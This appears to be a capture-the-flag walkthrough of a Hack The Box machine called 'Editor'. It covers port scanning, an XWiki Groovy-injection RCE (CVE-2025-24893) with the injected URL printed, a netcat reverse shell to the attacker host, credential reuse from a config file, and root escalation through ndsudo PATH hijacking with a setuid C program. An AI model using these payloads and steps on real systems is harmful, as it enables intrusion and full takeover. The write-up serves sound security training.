---
name: Editor
difficulty: easy
os: linux
platform: htb
date: 2025/08/11
releasedDate: 2099-12-31
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ba9dec0d022d3c3b6a96aa5dba4772c7.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.80 -o allPorts
```
```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

We add dns resolution to our `/etc/hosts` file for easier access:

```bash
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options:

```bash
nmap -p 22,80,8080 -sCV editor.htb -oN targeted
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
|_http-server-header: Jetty(10.0.20)
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can explore the web app running on port 8080, which is an XWiki instance. The main page provides a brief introduction to XWiki, and we can see that it has a login page.

There we can see the version running, which is `XWiki Debian 15.10.8`.

If we search the web, we can find a RCE (Remote Code Execution) vulnerability for this version, CVE-2025-24893. 

We can clone the exploit repository from GitHub:

```bash
git clone https://github.com/gunzf0x/CVE-2025-24893
```
## User Exploitation

We can then navigate to the cloned directory and run the exploit:

```bash
cd CVE-2025-24893
python3 CVE-2024-24893.py -t http://editor.htb:8080/ -c "ping 10.10.14.216"
```
```
[*] Attacking http://editor.htb:8080/
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22ping%2010.10.14.216%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D                             
[*] Command executed

~Happy Hacking
```

We can check our listener and verify if we received a ping from the target with `tcpdump -i tun0 icmp`.

Next we try to get a reverse shell. We can use the same command but change the payload to get a reverse shell:

```bash
python3 CVE-2024-24893.py -t http://editor.htb:8080/ -c "busybox nc 10.10.14.216 4443 -e /bin/bash"```
```

And we run a listener on our machine:

```bash
nc -lvnp 4443
```

We now have a reverse shell on the target machine. We can check our user by running:

```bash
whoami
```
```
xwiki
```

We can find a possible credential in `etc/xwiki/hibernate.cfg.xml`
```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

We try connecting via SSH using the found credentials and the user `oliver`:

```bash
ssh oliver@editor.htb
whoami
```
```
oliver
```

We find the user flag in the home directory:

```bash
cat /home/oliver/user.txt
```
```
user flag value
```
## Root Exploitation

We can check if the user `oliver` has sudo privileges:

```bash
sudo -l
```
```
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

We check the groups the user `oliver` belongs to:

```bash
id
```
```
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

We find `netdata` is installed in `editor.htb` and it has a plugin called `ndsudo` that allows users to run commands as root. 
```bash
find / -perm -4000 2>/dev/null
```
```
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

We find out `netdata` installed version is `v1.45.2`, which is vulnerable to a privilege escalation exploit (CVE-2024-32019).
This vulnerability takes advantage of the `ndsudo` plugin, which is a SUID root binary intended to securely execute a limited set of system commands (like nvme) on behalf of non-root users.
This plugin is misconfigured, allowing users to change the PATH environment variable and execute arbitrary binaries with root privileges.

We create a C code named `nvme.c` in our local machine:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

We set up a listener on port 4444 on `editor.htb`:

```bash
nc -lvnp 4444 > nvme
```

We compile it in our machine and transfer it to the target machine:

```bash
gcc nvme.c -o nvme
cat nvme | nc editor.htb 4444
```

We prepare the exploit environment:
```bash
mkdir -p /tmp/fakebin
mv nvme /tmp/fakebin/
chmod +x /tmp/fakebin/nvme
export PATH=/tmp/fakebin:$PATH
which nvme
```
```
/tmp/fakebin/nvme
```

We trigger the exploit by running:

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

This way, ndsudo executes our `nvme` binary with root privileges, giving us a root shell:

```bash
whoami
```
```
root
```

We can find the root flag in the root directory:

```bash
cat /root/root.txt
```
```
root flag value
```

## Conclusion
We successfully exploited the XWiki vulnerability to gain a reverse shell, escalated our privileges to the user `oliver`, and finally exploited the `ndsudo` vulnerability to obtain root access on the target machine. This write-up demonstrates the importance of keeping software up-to-date and properly configured to mitigate such vulnerabilities. Happy hacking!
